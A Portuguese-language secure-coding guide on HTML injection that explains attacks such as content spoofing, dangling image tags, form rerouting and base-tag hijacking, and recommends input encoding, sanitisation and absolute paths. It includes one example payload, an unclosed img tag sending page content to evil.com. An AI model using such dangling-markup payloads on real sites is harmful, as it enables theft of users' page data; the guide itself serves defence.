---
title: Injeções de HTML
---
## Descrição

Sempre que um invasor pode injetar HTML em sua aplicação, há uma variedade de
ataques que ele poderia realizar como:

1. Falsificação de conteúdo
2. Injeção de Tag de imagem
3. Reencaminhamento de Formulário
4. Base Jumping
5. Substituição de elemento
6. Hanging Textarea

Mesmo quando seu aplicativo intercepta injeções de XSS por meio de um cabeçalho de política de segurança de conteúdo, o mesmo ainda permanece vulnerável aos ataques citados acima.

## Solução

1. Falsificação de conteúdo Também conhecida como "Injeção de Conteúdo" ou "Desfiguração Virtual" ocorre sempre que um invasor pode injetar código no seu aplicativo. É muito importante limpar e/ou codificar os dados do usuário antes de exibi-los na tela como HTML.

2. A injeção da tag de imagem ocorre sempre que um invasor injeta uma tag de imagem quebrada com um parâmetro não finalizado, como: `"img src='http://evil.com?steal.php?value="`. Todo conteúdo após value=parametro será agora roubado e enviado para evil.com pelo invasor até que a injeção encontre a próxima ocorrência de uma única cotação correspondente.
Novamente, você deve limpar e codificar a entrada do usuário para impedir que uma tag de imagem seja injetada em seu aplicativo. Sempre que um usuário tiver permissão para enviar uma imagem em seu aplicativo, imponha e verifique se o aplicativo aceita apenas tags não quebradas válidas.

3. A tag "form" não pode ser aninhada. A ocorrência de nível superior desse elemento sempre tem precedência sobre as aparências subseqüentes. Novamente, você deve evitar esse tipo codificando e sanitizando adequadamente as entradas do usuário.

4. Sempre que um invasor injeta uma tag "base" em seu aplicativo, ele pode roubar dados, porque especifica o URL/destino base para onde processar os dados. 
A solução para o salto base seria usar caminhos absolutos em seu aplicativo, como action='/update_profile.php' em vez de: action='update_profile.php'

O 5/6 também pode ser facilmente evitado, basta codificar ou sanitizar a entrada do usuário enviada para a sua aplicação. Sempre valide sua entrada do usuário em um nível alto (restrição do lado do servidor). Sempre que sua aplicação espera um número inteiro, você deve validar e verificar se o usuário enviou realmente a entrada que você esperava; caso contrário, você encerra e registra a solicitação.
